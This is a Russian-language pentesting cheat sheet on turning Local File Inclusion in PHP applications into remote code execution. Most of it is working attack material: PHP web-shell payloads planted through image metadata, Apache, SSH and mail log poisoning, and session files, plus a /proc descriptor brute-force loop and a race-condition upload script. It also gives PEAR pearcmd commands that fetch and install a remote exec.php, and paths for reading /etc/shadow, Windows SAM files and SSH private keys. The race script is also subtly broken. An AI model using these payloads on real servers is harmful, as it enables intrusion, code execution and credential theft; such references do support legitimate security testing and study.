> **LFI (Local File Inclusion)** - это уязвимость, которая возникает, когда веб-приложение включает файлы из локальной файловой системы, часто из-за небезопасной обработки пользовательского ввода.
>> Если пользователь может контролировать путь к файлу, он потенциально может включить конфиденциальные или опасные файлы, такие как системные файлы (/etc/passwd), конфигурационные файлы или даже вредоносные файлы, что может привести к удаленному выполнению кода (RCE).

* [LFI в RCE через /proc/*/fd](#LFI-в-RCE-через-procfd)
* [LFI в RCE через /proc/self/environ](#LFI-в-RCE-через-procselfenviron)
* [LFI в RCE через iconv](#LFI-в-RCE-через-iconv)
* [LFI в RCE через загрузку файлов](#LFI-в-RCE-через-загрузку-файлов)
* [LFI в RCE через raceCondition](#LFI-в-RCE-через-raceCondition)
* [LFI в RCE через загрузку (FindFirstFile)](#LFI-в-RCE-через-загрузку-FindFirstFile)
* [LFI в RCE через phpinfo()](#LFI-в-RCE-через-phpinfo)
* [LFI в RCE через контролируемый лог-файл](#LFI-в-RCE-через-контролируемый-лог-файл) 
    * [Методы внедрения кода в логи](#Методы-внедрения-кода-в-логи)
    * [RCE через SSH](#RCE-через-SSH)
    * [RCE через почту](#RCE-через-почту)
    * [RCE через логи Apache](#RCE-через-логи-Apache)
    * [Практические примеры](#Практические-примеры)
* [LFI в RCE через PHP сессии](#LFI-в-RCE-через-PHP-сессии)
* [LFI в RCE через PHP PEARCMD](#LFI-в-RCE-через-PHP-PEARCMD)
* [LFI в RCE через файлы учетных данных](#LFI-в-RCE-через-файлы-учетных-данных)
* [URL](#URL)

# LFI в RCE через /proc/*/fd

1. Загрузи множество шеллов (например: 100)
2. Включи ```/proc/$PID/fd/$FD```, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
```bash
for pid in {1..1000}; do
    for fd in {0..20}; do
        curl -s "http://target.com/vuln.php?page=/proc/$pid/fd/$fd" | grep -q "PHP" && echo "Found: $pid/$fd"
    done
done
```
```python
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

* Через /proc/self/fd

```python
http://target.com/vuln.php?page=/proc/self/fd/3
http://target.com/vuln.php?page=/proc/self/fd/4
http://target.com/vuln.php?page=/proc/self/fd/5
```

# LFI в RCE через /proc/self/environ

* Как и с лог-файлом, отправь полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ

```php
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

# LFI в RCE через iconv

* Используй обертку iconv для запуска OOB в glibc (CVE-2024-2961), затем используйте LFI для чтения областей памяти из /proc/self/maps и загрузки бинарного файла glibc. В итоге вы получаете RCE, эксплуатируя структуру zend_mm_heap для вызова free(), который был переназначен на system с использованием custom_heap._free.

> **iconv** - это системная библиотека для конвертации текста между разными кодировками (например, UTF-8 → Windows-1251). В PHP есть враппер convert.iconv, который позволяет использовать эту библиотеку через PHP-фильтры.

**Требования:**

1. PHP 7.0.0 (2015) до 8.3.7 (2024)
2. GNU C Library (glibc) <= 2.39
3. Доступ к фильтрам convert.iconv, zlib.inflate, dechunk

**Exploit:**

* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

# LFI в RCE через загрузку файлов

* Если можно загрузить файл, просто внедри шелл в него (например: ```<?php system($_GET['c']); ?>)```.

```python
http://example.com/index.php?page=path/to/uploaded/file.png&c=id
```
```php
Для JPEG:
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

Для PNG:
pngcrush -text a "Comment" "<?php system($_GET['c']); ?>" original.png infected.png
```
* Чтобы файл оставался читаемым, лучше всего внедрять в метаданные pictures/doc/pdf.

# LFI в RCE через raceCondition

* Загрузи файл и вызови само-включение.
* Повтори загрузку множество раз чтобы:
   * увеличить шансы на выигрыш гонки
   * увеличить шансы угадывания
* Подбери брутфорсом включение /tmp/[0-9a-zA-Z]{6}
* Получи шелл.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

# LFI в RCE через загрузку (FindFirstFile)

⚠️ Работает только на Windows

```FindFirstFile``` позволяет использовать маски (```<<``` как ```*``` и ```>``` как ```?```) в путях LFI на Windows. 

> Маска - это, по сути, шаблон поиска, который может включать символы подстановки, позволяя пользователям или разработчикам искать файлы или каталоги на основе частичных имен или типов. В контексте FindFirstFile маски используются для фильтрации и сопоставления имен файлов или каталогов.

* */<< : Представляет любую последовательность символов.
* ?/> : Представляет любой одиночный символ.

Загрузи файл, он должен быть сохранен во временной папке C:\Windows\Temp\ со сгенерированным именем типа php[A-F0-9]{4}.tmp. Затем либо подберите брутфорсом 65536 имен файлов, либо используйте символ подстановки: http://site/vuln.php?inc=c:\windows\temp\php<<

# LFI в RCE через phpinfo()

PHPinfo() отображает содержимое любых переменных, таких как $_GET, $_POST и $_FILES.

> Сделав несколько запросов загрузки на скрипт PHPInfo и тщательно контролируя чтения, можно получить имя временного файла и сделать запрос к скрипту LFI, указав имя временного файла.

Используйте скрипт [phpInfoLFI.py](https://insomniasec.com/downloads/publications/phpinfolfi.py)

# LFI в RCE через контролируемый лог-файл

Просто добавь PHP код в лог-файл, сделав запрос к сервису (Apache, SSH...) и включи лог-файл.

```python
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/auth.log
http://example.com/index.php?page=/var/log/mail.log 
http://example.com/index.php?page=/var/log/syslog 
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### Методы внедрения кода в логи

1. Через User-Agent 

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```
```http
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

2. Через Referer

```bash
curl -H "Referer: <?php system(\$_GET['c']); ?>" http://target.com/
```

3. Через параметры URL

```bash
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
```
### RCE через FTP

* 21 порт 
* [Проверить логи]()
* проверить восзможность выполнения команд например ```<?php echo `whoami`;?>```

### RCE через SSH

Попробуй подключиться по SSH с PHP кодом в качестве имени пользователя <?php system($_GET["cmd"]);?>.

* Внедрение через SSH подключение:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

* Или с паролем:

```bash
sshpass -p 'password' ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

* Эксплуатация:

```http
http://target.com/vuln.php?page=/var/log/auth.log&cmd=id
```

### RCE через почту

Сначала отправьте email используя открытый SMTP, затем включите лог-файл расположенный по адресу http://example.com/index.php?page=/var/log/mail.

1. Через telnet
   
```python
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

В некоторых случаях вы также можете отправить email с помощью команды mail.

```php
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
echo "<?php system(\$_GET['cmd']); ?>" | mail -s "Test" www-data@target.com
```

* Эксплуатация:

```http
http://target.com/vuln.php?page=/var/log/mail.log&cmd=id
```

### RCE через логи Apache

* **Отравление access.log**

* Через User-Agent
  
```bash
curl -A "<?php system(\$_GET['c']); ?>" http://target.com/
```

* Через Referer

```bash
curl -H "Referer: <?php system(\$_GET['c']); ?>" http://target.com/
```

* Через путь

```bash
curl http://target.com/<?php system(\$_GET['c']); ?>
```

> **Примечание:** Логи экранируют двойные кавычки, поэтому используйте одинарные кавычки для строк в PHP полезной нагрузке.

* Эксплуатация:

```http
http://target.com/vuln.php?page=/var/log/apache2/access.log&c=id
```

### Практические примеры

```bash
# Шаг 1: Внедряем код в логи через User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Шаг 2: Проверяем наличие LFI
curl "http://target.com/vuln.php?page=/var/log/apache2/access.log"

# Шаг 3: Выполняем команды
curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=whoami"
curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id"
curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=ls+-la"
```

# LFI в RCE через PHP сессии

Проверьте, использует ли сайт PHP Session (PHPSESSID)

```python
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

В PHP эти сессии хранятся в файлах /var/lib/php5/sess_[PHPSESSID] или /var/lib/php/sessions/sess_[PHPSESSID]

```pyhon
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Установите cookie в ```<?php system('cat /etc/passwd');?>```

```php
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Используй LFI для включения файла PHP сессии

```python
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

* **Параметры, которые часто сохраняются в сессии:**
   * ```lang```, ```language```, ```locale```
   * ```theme```, ```skin```, ```template```
   * ```username```, ```user```, ```login```
   * ```preferences```, ```settings```

# LFI в RCE через PHP PEARCMD

> PEAR - это фреймворк и система распространения для повторно используемых компонентов PHP. По умолчанию ```pearcmd.php``` устанавливается в каждом Docker PHP образе с [hub.docker.com](https://hub.docker.com/_/php) в ```/usr/local/lib/php/pearcmd.php```, ```/usr/share/php/pearcmd.php```, ```/usr/lib/php/pearcmd.php```.

Файл pearcmd.php использует ```$_SERVER['argv']``` для получения своих аргументов. Директива ```register_argc_argv``` должна быть установлена в On в конфигурации PHP (```php.ini```) для работы этой атаки.

```python
register_argc_argv = On
```

Проверка настроек:

```
<?php phpinfo(); ?>

<?php echo ini_get('register_argc_argv'); ?>
```

Есть несколько способов эксплуатации:

* Метод 1: config create

```php
/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
/vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
```
> +config-create+ - команда PEAR

* Метод 2: man_dir

```php
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
/vuln.php?file=/tmp/exec.php&c=id
```
* -c /tmp/phpinfo.php - создать конфиг
* -d man_dir=<?echo(system($_GET['c']));?> - установить параметр с PHP кодом
* -s - показать конфигурацию

Созданный конфигурационный файл содержит веб-шелл.

```php
#PEAR_Config 0.9
a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
```

* Метод 3: download (требует внешнего сетевого подключения).

```php
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
/vuln.php?file=exec.php&c=id
```

* Метод 4: install (требует внешнего сетевого подключения). ```exec.php``` находится по пути ```/tmp/pear/download/exec.php```.

```php
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
/vuln.php?file=/tmp/pear/download/exec.php&c=id
```

# LFI в RCE через файлы учетных данных

Этот метод требует высоких привилегий внутри приложения для чтения чувствительных файлов.

### Версия для Windows

1. Извлеки файлы ```sam``` и ```system```.

```python
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

2. Затем извлеки хеши из этих файлов ```samdump2 SYSTEM SAM > hashes.txt```, и взломай их с помощью ```hashcat/john``` или используйте их с помощью техники Pass The Hash.

### Версия для Linux

1. Извлеки файлы /etc/shadow.

```python
http://example.com/index.php?page=../../../../../../etc/shadow
```

2. Затем взломай хеши внутри, чтобы войти через SSH на машину.

> **Другой способ получить доступ SSH к машине Linux через LFI** - это чтение файла приватного SSH ключа: id_rsa. Если SSH активен, проверьте, какой пользователь используется в машине, включив содержимое /etc/passwd и попытайтесь получить доступ к /<HOME>/.ssh/id_rsa для каждого пользователя с домашним каталогом.


# URL

* [lfi2rce-via-php-filters.html](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html)
* [php-lfi-with-nginx-assistance/](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
